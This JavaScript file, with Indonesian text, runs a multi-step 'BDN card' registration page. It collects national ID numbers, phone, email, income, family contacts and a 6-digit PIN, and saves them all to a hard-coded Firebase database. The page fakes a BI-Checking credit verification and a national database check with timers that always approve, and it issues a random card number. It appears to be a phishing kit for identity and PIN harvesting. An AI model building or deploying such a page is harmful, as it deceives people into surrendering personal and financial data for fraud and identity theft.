import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

// 1. KONFIGURASI FIREBASE
const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;
const totalSteps = 8;

// 2. INPUT FORMATTING (Uppercase, Numeric Only, etc)
document.addEventListener('DOMContentLoaded', () => {
    const inputs = {
        nama: document.getElementById('inputNama'),
        nik: document.getElementById('inputNIK'),
        wa: document.getElementById('inputWA'),
        inc: document.getElementById('income'),
        pin: document.getElementById('inputPW')
    };

    if(inputs.nama) inputs.nama.addEventListener('input', e => e.target.value = e.target.value.toUpperCase());
    if(inputs.nik) inputs.nik.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
    if(inputs.wa) inputs.wa.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
    if(inputs.inc) inputs.inc.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
    if(inputs.pin) inputs.pin.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6));
});

// 3. EMERGENCY CONTACT LOGIC
window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    if (container.children.length >= 5) return alert("Maksimal 5 kontak keluarga!");

    const div = document.createElement('div');
    div.className = 'emergency-item';
    div.innerHTML = `
        <div class="input-group">
            <label>Nama Keluarga</label>
            <input type="text" class="em-name" placeholder="Nama Lengkap" oninput="this.value = this.value.toUpperCase()">
        </div>
        <div class="input-group">
            <label>Nomor HP Keluarga</label>
            <input type="tel" class="em-phone" placeholder="08xxxxxxxxxx" oninput="this.value = this.value.replace(/\\D/g, '')">
        </div>
        <button type="button" class="btn-remove" onclick="this.parentElement.remove()">Hapus</button>
    `;
    container.appendChild(div);
};

// 4. NAVIGATION LOGIC
window.nextStep = (s) => {
    if (s === 2) {
        if (document.getElementById('inputNama').value.length < 3) return alert("Nama Lengkap wajib diisi!");
        if (document.getElementById('inputNIK').value.length !== 16) return alert("NIK wajib 16 digit!");
    } 
    else if (s === 3) {
        const wa = document.getElementById('inputWA').value;
        const email = document.getElementById('inputEmail').value;
        if (!wa.startsWith('08') || wa.length < 10) return alert("Nomor WhatsApp tidak valid!");
        if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) return alert("Format Email salah!");
    }
    else if (s === 4) {
        if (!document.getElementById('jobType').value || !document.getElementById('income').value) return alert("Pekerjaan & Pendapatan wajib diisi!");
    }
    else if (s === 5) {
        const names = document.querySelectorAll('.em-name');
        if (names.length === 0) return alert("Tambahkan minimal 1 keluarga!");
        for(let n of names) if(!n.value) return alert("Nama keluarga harus diisi!");
    }
    else if (s === 6) {
        if (document.getElementById('inputPW').value.length < 6) return alert("PIN Keamanan wajib 6 digit!");
    }

    currentStep = s;
    updateUI(s);
    window.scrollTo({ top: 0, behavior: 'smooth' });
    if (s === 6) simulasiAnalisis();
};

function updateUI(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
    
    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    const progressLine = document.getElementById('progressLine');
    if(progressLine) progressLine.style.width = percent + "%";
    
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.classList.remove('active', 'completed'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => status.innerText = "Sinkronisasi BI-Checking...", 1500);
    setTimeout(() => {
        status.innerHTML = "<b style='color:#22c55e'>IDENTITAS TERVERIFIKASI</b><br><span style='font-size:12px;color:#64748b'>Skor Kredit: A (Sangat Baik)</span>";
        btn.style.display = "flex";
    }, 3500);
}

// 5. DATA SAVING & QUEUE
window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui konfirmasi akhir!");
    const btn = document.getElementById('btnGenerate');
    btn.disabled = true;
    btn.innerText = "MENGHUBUNGI SERVER...";

    const nik = document.getElementById('inputNIK').value;
    try {
        const snapshot = await get(child(ref(db), `nasabah`));
        let exists = false;
        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) if (data[id].nik === nik) { exists = true; break; }
        }

        if (exists) {
            alert("NIK ini sudah pernah terdaftar!");
            location.reload();
        } else {
            updateUI(8);
            initQueue();
        }
    } catch(e) { alert("Masalah koneksi server!"); btn.disabled = false; }
};

function initQueue() {
    localStorage.setItem('bdn_timer', Date.now() + 120500);
    const interval = setInterval(() => {
        const diff = Math.ceil((localStorage.getItem('bdn_timer') - Date.now()) / 1000);
        if (diff <= 0) {
            clearInterval(interval);
            finalRevealProcess();
            return;
        }
        document.getElementById('fillBar').style.width = ((120 - diff) / 120 * 100) + "%";
        document.getElementById('timerDisplay').innerText = `Estimasi: ${diff} Detik`;
        
        const qS = document.getElementById('queueStatus');
        if (diff > 80) qS.innerText = "Enkripsi Protokol Keamanan...";
        else if (diff > 40) qS.innerText = "Verifikasi Database Nasional...";
        else qS.innerText = "Menerbitkan Sertifikat Digital...";
    }, 1000);
}

// 6. REVEAL & CARD FLIP LOGIC
async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';

    const cardNo = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
    await saveToRealtime(cardNo);

    for(let i=1; i<=3; i++) {
        await new Promise(r => setTimeout(r, 1000));
        document.getElementById(`rev${i}`).classList.add('show');
    }

    setTimeout(() => {
        const scene = document.querySelector('.card-scene');
        if(scene) {
            scene.style.opacity = "1";
            scene.style.transform = "scale(1)";
        }
        document.getElementById('btnDownload').style.display = "flex";
        document.getElementById('btnFlip').style.display = "block";
    }, 800);
}

async function saveToRealtime(cardNo) {
    const dataKeluarga = Array.from(document.querySelectorAll('.emergency-item')).map(item => ({
        nama: item.querySelector('.em-name').value,
        hp: item.querySelector('.em-phone').value
    }));

    try {
        await set(ref(db, 'nasabah/' + cardNo), {
            nama: document.getElementById('inputNama').value,
            nik: document.getElementById('inputNIK').value,
            wa: document.getElementById('inputWA').value,
            email: document.getElementById('inputEmail').value,
            pekerjaan: document.getElementById('jobType').value,
            pendapatan: document.getElementById('income').value,
            kontak_darurat: dataKeluarga,
            pin: document.getElementById('inputPW').value,
            nomor_kartu: cardNo,
            saldo: 1,
            tgl_daftar: new Date().toLocaleString()
        });

        document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
        document.getElementById('displayName').innerText = document.getElementById('inputNama').value;
    } catch(e) { console.error(e); }
}

// 7. SCREENSHOT WITH FLIP PROTECTION
window.takeScreenshot = () => {
    const cardInner = document.getElementById('cardInner');
    const area = document.getElementById('captureArea');
    const btn = document.getElementById('btnDownload');

    // Jika sedang terbalik, balikkan dulu ke depan baru foto
    if (cardInner && cardInner.classList.contains('is-flipped')) {
        cardInner.classList.remove('is-flipped');
        setTimeout(capture, 800); 
    } else {
        capture();
    }

    function capture() {
        btn.innerText = "MENGUNDUH...";
        // @ts-ignore
        html2canvas(area, { 
            scale: 3, 
            backgroundColor: null, 
            useCORS: true,
            logging: false,
            borderRadius: 20
        }).then(canvas => {
            const link = document.createElement('a');
            link.download = `BDN-CARD-${document.getElementById('inputNama').value}.png`;
            link.href = canvas.toDataURL("image/png");
            link.click();
            btn.innerText = "📸 SIMPAN GAMBAR KARTU";
        });
    }
};
